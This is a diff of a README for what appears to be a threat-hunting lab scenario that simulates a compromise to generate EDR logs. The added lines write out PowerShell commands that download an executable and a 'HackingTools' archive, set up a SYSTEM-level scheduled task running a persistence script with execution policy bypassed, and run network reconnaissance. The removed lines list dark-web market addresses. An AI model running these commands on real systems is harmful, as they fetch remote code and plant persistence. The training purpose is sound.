@@ -10,11 +10,12 @@ The "malicious" executable used within the project was originally written as a P
 1. Several failed user logons in quick succession.
 2. Opened a PowerShell terminal and executed the command `Invoke-WebRequest -Uri \"https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/MaliciousExecutable.exe\" -OutFile \"$env:USERPROFILE\\Downloads\\MaliciousExecutable.exe\"` to initiate the `MaliciousExecutable.exe` download.
 3. Once `MaliciousExecutable.exe` was downloaded, the threat actor simply double-clicked the executable to run it. 
-4. Connect to TOR and browse a few sites. For example:
-   - **WARNING: The links to onion sites change a lot and these have changed. However if you connect to Tor and browse around normal sites a bit, the necessary logs should still be created:**
-   - Current Dread Forum: ```dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion```
-   - Dark Markets Forum: ```dreadytofatroptsdj6io7l3xptbet6onoyno2yv7jicoxknyazubrad.onion/d/DarkNetMarkets```
-   - Current Elysium Market: ```elysiumutkwscnmdohj23gkcyp3ebrf4iio3sngc5tvcgyfp4nqqmwad.top/login```
+4. When executed, `MaliciousExecutable.exe` ran several encoded PowerShell commannds to populate the EDR logs. These commands consisted of:
+   - First Command: `Invoke-WebRequest -Uri "https://github.com/AaronRMartinez/Threat-Hunting-Scenario-Compromise/raw/refs/heads/main/HackingTools.zip" -OutFile "$env:USERPROFILE\Downloads\HackingTools.zip"`
+   - Second Command: `Expand-Archive -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -DestinationPath "$env:USERPROFILE\Downloads\HackingTools" -Force`
+   - Third Command: `Remove-Item -Path "$env:USERPROFILE\Downloads\HackingTools.zip" -Force`
+   - Fourth Command: `schtasks /create /tn "PersistenceScheduledTask" /tr "powershell.exe -ExecutionPolicy Bypass -File $env:USERPROFILE\Downloads\HackingTools\HackingTools\PersistenceScript.ps1" /sc onlogon /ru SYSTEM /f`
+   - Fifth Command: `arp -a | Out-File -FilePath "$env:USERPROFILE\Desktop\arp_results.txt"`
 
 6. Create a folder on your desktop called ```tor-shopping-list.txt``` and put a few fake (illicit) items in there
 7. Delete the file.
